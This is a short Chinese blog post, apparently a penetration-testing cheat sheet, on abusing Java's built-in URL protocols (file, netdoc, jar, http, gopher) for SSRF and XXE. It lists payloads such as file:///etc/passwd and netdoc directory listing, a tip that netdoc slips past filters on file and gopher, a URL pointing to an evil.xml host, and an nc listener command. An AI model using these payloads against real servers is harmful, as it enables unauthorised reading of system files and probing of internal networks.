---
layout: post
title:  java自定义通信协议及利用
noToc: true
date:   2019-01-13 09:30:00 +0800
tags: 内网探测 渗透测试
cover: '../assets/' 
---

java自定义通信协议及利用

JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持 。

file(ssrf、xxe)：

```
file:///etc/passwd
```

netdoc(ssrf、xxe)：

知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了 

```
netdoc:///var/www/html/
```

ps:过滤了file、gopher可使用netdoc代替

jar(ssrf、xxe):

```
jar:http://localhost:9999/jar.zip!/1.php
```

http(ssrf、xxe):

```
http://url/file.ext
http://example.com/evil.xml
```

gopher(ssrf、xxe):

```
gopher://ip:port/xxx
```

监听：nc -vv -l -p  port

